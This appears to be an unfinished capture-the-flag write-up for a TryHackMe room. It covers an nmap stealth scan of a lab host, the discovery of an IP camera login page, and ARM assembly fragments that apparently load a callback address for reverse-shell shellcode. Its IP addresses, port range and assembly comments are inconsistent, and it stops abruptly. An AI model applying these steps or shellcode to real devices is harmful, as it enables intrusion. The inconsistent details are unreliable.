### Snowy ARMageddon ###

Victim IP: `10.10.106.239`

Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.

```
sudo nmap -sS -p1-65335 10.10.200.123
```
```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-15 09:02 GMT
Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.200.123)
Host is up (0.00029s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
MAC Address: 02:5F:E1:66:EA:0B (Unknown)

```
From the scan results we can see four open ports:
  -  Port `22` for SHH
  - Port `23` for Telnet
  - Port `8080` (most probably a website)
  - Port `50628` - an unusual port number

Connecting via SSH is not possible and we get a `Permission denied (publickey)` error.   Attempting to connect via Telnet successfully establishes a connection which is immediately terminated by the host, and since we don't know anything about port `50628` so far, we're going to ignore it for the time being.

This leaves us with port `8080` and we can just open a browser and navigate to `http://10.10.200.123:8080/` to bring up a website with an angry-looking elf:

![angry-looking elf](https://private-user-images.githubusercontent.com/60655500/296706743-c385f64f-641c-4ecc-8a62-967f08084d7d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MDUzMTAwOTAsIm5iZiI6MTcwNTMwOTc5MCwicGF0aCI6Ii82MDY1NTUwMC8yOTY3MDY3NDMtYzM4NWY2NGYtNjQxYy00ZWNjLThhNjItOTY3ZjA4MDg0ZDdkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAxMTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMTE1VDA5MDk1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJkNjhhYjkyMTJiYTIzMGFkYjBjMTgzNzU2ODY2NGRjODRiZTRjMmZmZDhiZWI5MGZmNjU3MGNkY2FmNzJlMjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.2yZw1zeU49ni4BdVoZMqBM-GnLyi8Nx9KaTgKTmU94s)

This must be the **"internal-only web application"** that is our main target.  But as the name implies - it's only accessible from the internal network, so we need to figure out a way in first.

Let's have a look at port `50628` next - maybe we can access it through the browser too by navigating to `http://10.10.106.239:50628` ?  Yup, it brings up a login page for a **Trivision NC-227WF HD 720P** IP Network camera:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)


```
21      /* ADDR */
22      mov r1, #0xEC       ; Move 0xEC into register r1 (0x0A * 256 + 0xEC = 10.10)
23      lsl r1, #8          ; Left shift r1 by 8 bits
24      add r1, #0x0A       ; Add 0x0A to r1 (0xEC0A = 10.10 in little-endian)
25      lsl r1, #8          ; Left shift r1 by 8 bits
26      add r1, #0x03       ; Add 0x03 to r1 (0x0AEC03 = 10.10.236.3 in little-endian)
27      push {r1}           ; Push the value in r1 onto the stack (little-endian)
```

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/dbffc18e-c759-424f-a818-9afc521d082f)


```
 mov r1, #0xdc
 lsl r1, r1, #8
 add r1, r1, #0x42
 lsl r1, r1, #8
 add r1, r1, #0x08
 add r1, r1, #0x02
 lsl r1, r1, #8
 add r1, r1, #0x08
```

<!--stackedit_data:
eyJoaXN0b3J5IjpbLTExMzkyMzM1MiwtNDIyMzQ1OTI2LC0xMj
A2MDY3NDE0XX0=
-->
